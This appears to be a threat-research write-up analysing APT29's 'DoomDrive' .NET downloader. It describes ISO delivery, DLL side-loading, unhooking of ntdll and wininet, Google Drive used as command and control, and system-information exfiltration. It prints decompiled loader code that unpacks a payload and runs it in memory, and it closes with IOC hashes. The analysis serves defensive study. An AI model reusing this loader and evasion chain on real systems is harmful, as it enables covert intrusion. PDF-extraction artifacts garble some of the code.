It is also delivered via an ISO file like\nthe previous ones. I call this new .NET downloader `DoomDrive in reference to the older`\n```\nBoomBox one. With this latest addition, there are 4 known early stage downloaders that\n\n```\nabuse legitimate services:\n\n\nFirst\nseen\nITW\n\nJune\n2022\n\nJune\n2022\n\nJanuary\n2022\n\nFebruary\n2021\n\n\nMalware\ndownloader\n\n\nDoomDrive Google Drive Russian APT29 Hackers Use Online Storage\nServices, DropBox and Google Drive\n\n?

This`\nISO sample contains the following files:\n\n\n-----\n\nUsually, the only file that isn’t hidden in a default Windows environment is `Information`\nthat is a LNK file. It contains the following target string:\n```\n%windir%/system32/cmd.exe /k start agenda.exe\n\n\n```\nWhen double-clicked it runs `agenda.exe that is a legitimate file signed by Adobe. This file`\nimports a couple of functions from `vcruntime140.dll as can be seen by looking at the`\nimport table:\n\nThe DLL is usually located in the Windows system folder and gets also loaded from there. In\nthis case, the file was placed in the same folder as the EXE to abuse the DLL search order\n(DLL side-loading). The file `vcruntime140.dll is a slightly modified version of the original`\nsigned one. The size of the last section ( .reloc ) was increased with 0 bytes which\noverwrites the signature information present as overlay data. Additionally, the `.reloc`\nsection characteristics were changed to make it also writable. The reason for these changes\nis to use the resulting space to expand the import table with an additional entry:\n\n\n-----\n\nAs a result, when `agenda.exe is executed, it loads` `vcruntime140.dll which in turn`\nloads `vctool140.dll . The same trick with an expanded import table was used in the ISO`\nfile that contains the Slack downloader. The file `vctool140.dll is a loader for the`\nencrypted `DoomDrive payload named` `_ .`\n\n## The .NET EXEcution layer\n\nAs mentioned, `vctool140.dll is a loader for the` `DoomDrive downloader that is a .NET`\nassembly. It is partly similar to the loader of `BEATDROP and the Slack downloader. In`\ncomparison to the loader of `BEATDROP, it not only unhooks all hooked functions in`\n```\nntdll.dll, but also those of wininet.dll . The loader of the Slack downloader is the\n\n```\nmost advanced one as it also uses code and string obfuscation among other things.\n\nWhen executed, it first unhooks all functions in `ntdll.dll and` `wininet.dll . For this, it`\nmaps a fresh version of each Windows DLL into memory and overwrites the `.text`\nsections of the already loaded modules with those of the mapped ones. An example code of\n[this technique can be found here.](https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++)\n\nNext, it loads the MSZIP compressed `DoomDrive file ( _ ) to memory and unpacks it. The`\nresult is a 64-bit .NET EXE assembly that gets executed via COM interface API functions.\nThe decompiled and cleaned up code is as follows:\n\n\n-----\n\n```\n...\n\nFilename[v2 + 1] = '_';\n\nv6 = v2 + 2i64;\n\nif ( v6 >= 0x104 )\n\n{\n\n  _report_rangecheckfailure(v4, v2, v1, v3);\n\n  __debugbreak();\n\n}\n\nFilename[v6] = 0;\n\nhFile = CreateFileA(Filename, GENERIC_READ, 1u, 0i64, 3u, FILE_ATTRIBUTE_NORMAL,\n0i64);\n\nhFile_0 = hFile;\n\nif ( hFile != INVALID_HANDLE_VALUE )\n\n{\n\n  FileSize = GetFileSize(hFile, 0i64);\n\n  Buffer = j__malloc_base(FileSize);\n\n  ReadFile(hFile_0, Buffer, FileSize, &NumberOfBytesRead, 0i64);\n\n  CloseHandle(hFile_0);\n\n  UncompressedBuffer = 0i64;\n\n  LODWORD(hFile) = CreateDecompressor(COMPRESS_ALGORITHM_MSZIP, 0i64,\n&hDecompressor);\n\n  if ( hFile )\n\n  {\n\n    UncompressedDataSize = 0i64;\n\n    UncompressedBufferSize = 0i64;\n\n    if ( Decompress(hDecompressor, Buffer, NumberOfBytesRead, 0i64, 0i64,\n&UncompressedBufferSize)\n\n      || GetLastError() != ERROR_INSUFFICIENT_BUFFER\n\n      || (UncompressedBuffer = j__malloc_base(UncompressedBufferSize),\n\n        LODWORD(hFile) = Decompress(hDecompressor, Buffer, NumberOfBytesRead,\nUncompressedBuffer, UncompressedBufferSize, &UncompressedDataSize),\n\n        hFile) )\n\n    {\n\n      CloseDecompressor(hDecompressor);\n\n      pCLRMetaHost = 0i64;\n\n      ppRuntime = 0i64;\n\n      pCorRuntimeHost = 0i64;\n\n      LODWORD(hFile) = CLRCreateInstance(&CLSID_CLRMetaHost, &ICLRMetaHost,\n&pCLRMetaHost);\n\n      if ( hFile >= 0 )\n\n      {\n\n        wcscpy(pwzVersion, L\"v4.0.30319\");\n\n        LODWORD(hFile) = pCLRMetaHost->lpVtbl->GetRuntime(pCLRMetaHost,\npwzVersion, &riid, &ppRuntime);\n\n        if ( hFile >= 0 )\n\n        {\n\n          LODWORD(hFile) = ppRuntime->lpVtbl->GetInterface(ppRuntime,\n&CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, &pCorRuntimeHost);\n\n          if ( hFile >= 0 )\n\n          {\n\n            pCorRuntimeHost->lpVtbl->Start(pCorRuntimeHost);\n\n            pAppDomain = 0i64;\n\n```\n\n-----\n\n```\n            LODWORD(hFile) pCorRuntimeHost >lpVtbl\n>GetDefaultDomain(pCorRuntimeHost, &pAppDomain);\n\n            if ( hFile >= 0 )\n\n            {\n\n              pDefaultAppDomain = 0i64;\n\n              LODWORD(hFile) = (pAppDomain->lpVtbl->QueryInterface)\n(&AppDomain, &pDefaultAppDomain);\n\n              if ( hFile >= 0 )\n\n              {\n\n                rgsabound.cElements = UncompressedDataSize;\n\n                rgsabound.lLbound = 0;\n\n                safeArray = SafeArrayCreate(VT_UI1, 1u, &rgsabound);\n\n                SafeArrayLock(safeArray);\n\n                count = 0;\n\n                if ( UncompressedDataSize )\n\n                {\n\n                  index = 0i64;\n\n                  do\n\n                  {\n\n                    *(safeArray->pvData + index) =\nUncompressedBuffer[index];\n\n                    ++count;\n\n                    ++index;\n\n                  }\n\n                  while ( count < UncompressedDataSize );\n\n                }\n\n                SafeArrayUnlock(safeArray);\n\n                pDefaultAppDomain_0 = pDefaultAppDomain;\n\n                pManagedAssembly = 0i64;\n\n                hr = (pDefaultAppDomain->lpVtbl->Load_3)(safeArray,\n&pManagedAssembly);\n\n                if ( hr < 0 )\n\n                  Cleanup(hr, pDefaultAppDomain_0, &AppDomain);\n\n                pManagedAssembly_0 = pManagedAssembly;\n\n                if ( pManagedAssembly )\n\n                  (pManagedAssembly->lpVtbl->Release)();\n\n                DoomDriveMain = 0i64;\n\n                (pManagedAssembly_0->lpVtbl->EntryPoint)\n(&DoomDriveMain);\n\n                VariantInit(&pvarg);\n\n                DoomDriveMain_0 = DoomDriveMain;\n\n                VariantInit(&pRetVal);\n\n                obj = pvarg;\n\n                hr_0 = (DoomDriveMain_0->lpVtbl->Invoke_3)(&obj,\n0i64, &pRetVal);\n\n                if ( hr_0 < 0 )\n\n                  Cleanup(hr_0, DoomDriveMain_0, &word_1800177E8);\n\n                pRetVal_0 = pRetVal;\n\n                VariantClear(&pRetVal_0);\n\n                VariantClear(&pvarg);\n\n                (ppRuntime->lpVtbl->Release)(ppRuntime);\n\n                (pCLRMetaHost->lpVtbl->Release)(pCLRMetaHost);\n\n```\n\n-----\n\n```\n                LODWORD(hFile) (pCorRuntimeHost >lpVtbl >Release)\n(pCorRuntimeHost);\n\n              }\n\n            }\n\n          }\n\n        }\n\n      }\n\n    }\n\n  }\n\n}\n\n...\n\n```\n[The code is very similar to this one which in turn is a modification of Microsoft’s old example](https://www.unknowncheats.me/forum/2489131-post1.html)\ncode named `CppHostCLR . It shows how to run a managed .NET assembly in an`\nunmanaged application via the Component Object Model in C++.\n\n## With DoomDrive to the next layer\n\nThere is reason to believe that `DoomDrive wasn’t only compressed for obfuscation`\npurposes, but also because it’s bigger than 1 MB in size. This is because the C# Google\nDrive API (and [Newtonsoft Json) libraries were statically linked into the file.](https://www.newtonsoft.com/json)\n\nIt contains the following Google Drive credentials which it uses throughout the code:\n\nWhen executed, it first copies all files except for the LNK one from the mounted ISO drive to\nthe `%APPDATA% folder. For persistency, it creates a registry` `Run entry in` `HKCU with`\n```\nagenda.exe as the target file. To create a unique victim ID that gets later used mutliple\n\n```\ntimes, it retrieves the Windows logon name and calculates a SHA-256 hash string on it. At\nlast, it prepends the hardcoded `Id value` `99 (see screenshot above) to build the final ID.`\n\nThe first contact to the attacker’s Google drive is made by retrieving the list of text files\navailable for the victim’s ID via the `ListFiles API function:`\n```\nListFiles(\"trashed = false and name contains '\" + <VictimID> + \"' and mimeType =\n'text/plain'\")\n\n```\n\n-----\n\nIf the response is empty, it gets system information from the victim and uploads it in\nencrypted form within a TXT file to the attacker’s drive. The following information is retrieved:\n\nWindows logon name\nUser domain name\nLocal computer domain name\nList of network interfaces\nList of process names\n\nIt is encrypted with a hardcoded XOR key (see screenshot above, base64 encoded) and\nbase64 encoded. The victim user ID is used for the text file name. When the upload was\nsuccessful, the program continues, otherwise it repeats the last procedure. To hint when the\nfile was uploaded, it creates (or updates) a comment for the file with the current date as\ncontent.\n\nTo get the next stage payload, it lists all available PDF files in the attacker’s drive as\nindicated by the MIME type:\n```\nListFiles(\"trashed = false and name contains '\" + <VictimID> + \"' and mimeType =\n'application/pdf'\");\n\n\n```\nThis file must have been created by the attacker and is only disguised as a PDF. It’s actually\nan AES encrypted (see screenshot above for IV/key, base64 encoded) shellcode payload.\nThe payload is executed in the following way:\n\n[An example of the executioner C# code can be found here. At the time of the analysis, the](https://github.com/cobbr/SharpGen/blob/master/Source/SharpSploit/Execution/ShellCode.cs)\nattacker’s drive didn’t respond anymore, thus it remains unknown what the next stage was.\n\n\n-----\n\n## Conclusion\n\nAs we’ve seen in the past, the threat actor APT29 always uses several early-stage tools\nduring a campaign. The latest .NET downloader abuses another legitimate service to get a\npayload on a victim’s system. In contrast to the other legitimate services, the developer didn’t\nseem to enjoy working with the Google API as can be seen in the PDB path of `DoomDrive`\n(^^):\n```\nC:\\Users\\user\\source\\repos\\GoogleDriveSucks\\src\\GoogleDriveSucks\\Drive.pdb\n\n\n## IOCs\n\n```\n**ISO**\n\n347715f967da5debfb01d3ba2ede6922801c24988c8e6ea2541e370ded313c8b\n\n**DoomDrive**\n\n295452a87c0fbb48eb87be9de061ab4e938194a3fe909d4bcb9bd6ff40b8b2f0\n\n\n-----",
